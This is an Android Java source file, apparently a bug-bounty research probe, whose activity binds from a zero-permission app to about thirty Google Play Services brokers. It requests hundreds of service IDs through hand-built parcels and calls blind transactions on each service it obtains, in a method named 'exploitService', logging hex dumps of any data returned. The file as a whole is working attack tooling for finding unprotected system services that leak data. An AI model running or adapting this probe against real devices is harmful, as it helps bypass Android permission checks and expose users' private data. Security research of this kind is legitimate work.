package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class GmsBroadProbeActivity extends Activity {
    private static final String T = "GMSBROAD";
    private static final String BROKER_DESC = "com.google.android.gms.common.internal.IGmsServiceBroker";
    private static final String GMSCB_DESC = "com.google.android.gms.common.internal.IGmsCallbacks";

    private static final String[] BROKER_ACTIONS = {
        "com.google.android.gms.clearcut.service.START",
        "com.google.android.gms.wearable.BIND",
        "com.google.android.gms.phenotype.service.START",
        "com.google.android.gms.nearby.connection.service.START",
        "com.google.android.gms.cast.service.BIND_CAST_DEVICE_CONTROLLER_SERVICE",
        "com.google.android.gms.auth.service.START",
        "com.google.android.gms.people.service.START",
        "com.google.android.gms.drive.ApiService.START",
        "com.google.android.gms.wallet.service.BIND",
        "com.google.android.gms.auth.api.credentials.service.START",
        "com.google.android.gms.identity.service.BIND",
        "com.google.android.gms.location.internal.GoogleLocationManagerService.START",
        "com.google.android.gms.games.service.START",
        "com.google.android.gms.kids.service.START",
        "com.google.android.gms.tapandpay.service.BIND",
        "com.google.android.gms.smartdevice.d2d.TargetDeviceService.START",
        "com.google.android.gms.backup.GmsBackupTransport.START",
        "com.google.android.gms.chromesync.service.START",
        "com.google.android.gms.ads.identifier.service.START",
        "com.google.android.gms.safetynet.service.START",
        "com.google.android.gms.analytics.service.START",
        "com.google.android.gms.appusage.service.START",
        "com.google.android.gms.droidguard.service.START",
        "com.google.android.gms.fonts.service.START",
        "com.google.android.gms.deviceconnection.service.START",
        "com.google.android.gms.growth.service.START",
        "com.google.android.gms.playintegrity.service.START",
        "com.google.android.gms.fido.fido2.regular",
    };

    private static final int[] SERVICE_IDS = {
        1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
        11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
        21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
        31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
        41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
        51, 52, 53, 54, 55, 56, 57, 58, 59, 60,
        61, 62, 63, 64, 65, 66, 67, 68, 69, 70,
        71, 72, 73, 74, 75, 76, 77, 78, 79, 80,
        81, 82, 83, 84, 85, 86, 87, 88, 89, 90,
        91, 92, 93, 94, 95, 96, 97, 98, 99, 100,
        103, 105, 110, 115, 120, 125, 130, 135, 140, 150,
        154, 158, 160, 168, 170, 180, 190, 200, 210, 220,
        230, 240, 250, 260, 269, 270, 280, 287, 290, 300
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== GMS Broad Probe v3 ===");
        Log.w(T, "UID=" + android.os.Process.myUid());
        Log.w(T, "Brokers=" + BROKER_ACTIONS.length + " IDs=" + SERVICE_IDS.length);
        new Thread(() -> {
            for (int bi = 0; bi < BROKER_ACTIONS.length; bi++) {
                probeBroker(BROKER_ACTIONS[bi]);
            }
            Log.w(T, "=== ALL BROKERS DONE ===");
        }).start();
    }

    private void probeBroker(String action) {
        String label = action.replace("com.google.android.gms.", "");
        final CountDownLatch bindLatch = new CountDownLatch(1);
        final IBinder[] brokerRef = {null};
        ServiceConnection conn = new ServiceConnection() {
            public void onServiceConnected(ComponentName n, IBinder binder) {
                brokerRef[0] = binder;
                bindLatch.countDown();
            }
            public void onServiceDisconnected(ComponentName n) {}
        };

        try {
            Intent intent = new Intent(action);
            intent.setPackage("com.google.android.gms");
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);
            if (!bound) { return; }
            if (!bindLatch.await(3, TimeUnit.SECONDS)) {
                try { unbindService(conn); } catch (Exception e) {}
                return;
            }
        } catch (Exception e) { return; }

        IBinder broker = brokerRef[0];
        Log.w(T, "[+] " + label + " connected");
        int found = 0;

        for (int svcId : SERVICE_IDS) {
            IBinder svc = requestService(broker, svcId);
            if (svc != null) {
                String desc = null;
                try { desc = svc.getInterfaceDescriptor(); } catch (Exception e) {}
                Log.w(T, "[+++] " + label + " SVC=" + svcId + " desc=" + desc);
                exploitService(svc, label, svcId, desc);
                found++;
            }
        }

        if (found == 0) Log.w(T, "[-] " + label + " 0 services");
        try { unbindService(conn); } catch (Exception e) {}
    }

    private IBinder requestService(IBinder broker, int serviceId) {
        final CountDownLatch latch = new CountDownLatch(1);
        final IBinder[] result = {null};

        IBinder cb = new Binder() {
            public String getInterfaceDescriptor() { return GMSCB_DESC; }
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                if (code >= 1 && code <= 5) {
                    try { data.enforceInterface(GMSCB_DESC); } catch (Exception e) { data.setDataPosition(0); }
                    data.readInt();
                    result[0] = data.readStrongBinder();
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    return true;
                }
                latch.countDown();
                return true;
            }
        };

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(BROKER_DESC);
            data.writeStrongBinder(cb);
            data.writeInt(1);
            int h = spBeginObject(data);
            spWriteInt(data, 1, 6);
            spWriteInt(data, 2, serviceId);
            spWriteInt(data, 3, 263332086);
            spWriteString(data, 4, getPackageName());
            spWriteBoolean(data, 12, true);
            spFinishObject(data, h);
            broker.transact(46, data, reply, 0);
        } catch (Exception e) {
        } finally {
            data.recycle();
            reply.recycle();
        }
        try { latch.await(1, TimeUnit.SECONDS); } catch (Exception e) {}
        return result[0];
    }

    private void exploitService(IBinder svc, String brokerLabel, int serviceId, String iface) {
        for (int tx = 1; tx <= 12; tx++) {
            try {
                Parcel d = Parcel.obtain();
                Parcel r = Parcel.obtain();
                if (iface != null) d.writeInterfaceToken(iface);
                svc.transact(tx, d, r, 0);
                if (r.dataSize() > 0) {
                    r.setDataPosition(0);
                    int exCode = r.readInt();
                    if (exCode == 0 && r.dataAvail() > 4) {
                        Log.w(T, "  [+] " + brokerLabel + " SVC=" + serviceId + " TX" + tx + " avail=" + r.dataAvail());
                        dumpData(r, brokerLabel + "_S" + serviceId + "_T" + tx);
                    } else if (exCode != 0) {
                        String msg = safeReadString(r);
                        if (msg != null && msg.contains("Security")) break;
                    }
                }
                d.recycle();
                r.recycle();
            } catch (SecurityException se) {
                break;
            } catch (Exception e) {}
        }
    }

    private void dumpData(Parcel p, String label) {
        int saved = p.dataPosition();
        try {
            p.setDataPosition(0);
            byte[] raw = p.marshall();
            StringBuilder hex = new StringBuilder();
            for (int i = 0; i < Math.min(raw.length, 64); i++) {
                hex.append(String.format("%02x", raw[i]));
                if ((i + 1) % 4 == 0) hex.append(" ");
            }
            Log.w(T, "  HEX(" + raw.length + "): " + hex);

            StringBuilder sb = new StringBuilder();
            for (byte b : raw) {
                if (b >= 32 && b < 127) {
                    sb.append((char) b);
                } else {
                    if (sb.length() >= 3) {
                        Log.w(T, "  STR: " + trunc(sb.toString(), 150));
                    }
                    sb.setLength(0);
                }
            }
            if (sb.length() >= 3) Log.w(T, "  STR: " + trunc(sb.toString(), 150));
        } catch (Exception e) {}
        p.setDataPosition(saved);
    }

    private int spBeginObject(Parcel p) { return spBeginVar(p, 20293); }
    private void spFinishObject(Parcel p, int pos) { spEndVar(p, pos); }
    private void spWriteInt(Parcel p, int fid, int val) { p.writeInt(fid | (4 << 16)); p.writeInt(val); }
    private void spWriteBoolean(Parcel p, int fid, boolean val) { p.writeInt(fid | (4 << 16)); p.writeInt(val ? 1 : 0); }
    private void spWriteString(Parcel p, int fid, String val) {
        if (val == null) return;
        int pos = spBeginVar(p, fid);
        p.writeString(val);
        spEndVar(p, pos);
    }
    private int spBeginVar(Parcel p, int fid) {
        p.writeInt(fid | 0xFFFF0000);
        p.writeInt(0);
        return p.dataPosition();
    }
    private void spEndVar(Parcel p, int s) {
        int e = p.dataPosition();
        p.setDataPosition(s - 4);
        p.writeInt(e - s);
        p.setDataPosition(e);
    }
    private String safeReadString(Parcel p) {
        try { return p.readString(); } catch (Exception e) { return null; }
    }
    private String trunc(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }
}
